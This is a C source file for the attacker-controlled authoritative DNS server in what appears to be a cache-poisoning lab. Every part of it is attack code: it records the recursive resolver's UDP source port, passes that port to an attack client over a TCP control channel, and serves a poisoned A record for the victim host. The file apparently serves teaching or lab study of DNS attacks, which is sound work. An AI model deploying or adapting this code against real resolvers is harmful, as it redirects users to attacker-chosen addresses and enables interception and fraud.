/*
 * auth_server.c
 *
 * Driver for the attacker-controlled authoritative name server.
 *
 * It serves DNS for the attacker's zone, records the recursive resolver's UDP
 * source port from the first query it receives, hands that port to the attack
 * client over the TCP control channel, and then keeps serving DNS: the victim
 * host is answered with a poisoned A record, every other name with an empty
 * authoritative response.
 */

#include "lab_config.h"
#include "control_channel.h"
#include "dns_responder.h"

#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define DNS_MAX_PACKET_SIZE 512

int main(void)
{
    uint16_t resolver_port = 0U;

    int dns_fd = create_dns_udp_socket();
    if (dns_fd < 0) {
        return 1;
    }

    int control_fd = control_listen((uint16_t)CONTROL_TCP_PORT);
    if (control_fd < 0) {
        (void)close(dns_fd);
        return 1;
    }

    /* Handle the first query (the attacker client's trigger) so we learn the
     * resolver's UDP source port before the control client asks for it. */
    {
        uint8_t buffer[DNS_MAX_PACKET_SIZE];
        struct sockaddr_in client_addr;
        memset(&client_addr, 0, sizeof(client_addr));
        socklen_t client_len = (socklen_t)sizeof(client_addr);

        ssize_t received = recvfrom(dns_fd, buffer, sizeof(buffer), 0,
                                    (struct sockaddr *)&client_addr, &client_len);
        if (received > 0) {
            handle_dns_query(dns_fd, buffer, (size_t)received,
                             &client_addr, client_len, &resolver_port);
        }
    }

    /* Hand the learned port to the attack client. */
    control_send_port_once(control_fd, resolver_port);

    /* Keep serving DNS indefinitely. */
    dns_serve_forever(dns_fd, &resolver_port);

    (void)close(control_fd);
    (void)close(dns_fd);
    return 0;
}
